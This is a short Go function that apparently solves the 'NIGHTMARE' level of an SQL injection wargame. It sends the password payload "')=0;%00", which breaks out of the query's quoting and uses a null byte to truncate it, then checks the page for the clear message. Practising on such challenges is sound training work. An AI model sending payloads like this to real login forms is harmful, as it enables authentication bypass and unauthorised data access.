package problem

import(
	"fmt"
	"strings"
)

func Nightmare(session string){
	file := "nightmare_a72d12e4f9c7c341cb6fe36881f7be01.php"
	
	param := map[string]string{
		"pw" : "')=0;%00",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"NIGHTMARE Clear!"){
		fmt.Println("NIGHTMARE Clear!")
	}
}